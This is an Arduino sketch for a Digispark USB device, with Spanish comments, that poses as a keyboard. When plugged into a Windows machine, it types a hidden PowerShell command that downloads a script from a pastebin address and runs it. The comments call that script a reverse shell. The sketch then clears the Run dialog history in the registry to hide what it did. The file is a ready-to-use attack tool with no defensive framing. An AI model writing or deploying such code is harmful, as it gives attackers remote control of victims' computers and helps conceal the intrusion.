#define kbd_es_es
#include "DigiKeyboard.h"


void setup() {
  // codigo

  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(1000);

  // Se descarga y se ejecuta la reverse shell 
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); 
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell -windowstyle hidden -nop \"IEX (New-Object Net.WebClient).DownloadString('https://pastebin.com/raw/ScEa8YWs');\""); //link del payload  
  DigiKeyboard.delay(1000);

  // se limpia el historial 
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); 
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell \"Remove-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU' -Name '*' -ErrorAction SilentlyContinue\""); 
}

void loop() {
  
}
